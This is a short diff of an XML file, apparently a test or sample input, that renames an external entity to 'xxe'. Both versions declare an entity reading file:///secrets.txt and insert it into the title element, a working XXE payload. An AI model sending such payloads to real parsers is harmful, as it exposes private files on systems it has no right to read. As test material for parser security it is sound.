@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
 
-<!DOCTYPE Company
+<!DOCTYPE newdoc
 [
-	<!ENTITY placeholder SYSTEM "file:///secrets.txt" >
+	<!ENTITY xxe SYSTEM "file:///secrets.txt" >
 ]>
 
 <item>
-    <title>&placeholder;</title>
+    <title>&xxe;</title>
     <description>Here is my descriptive description.</description>
 </item>
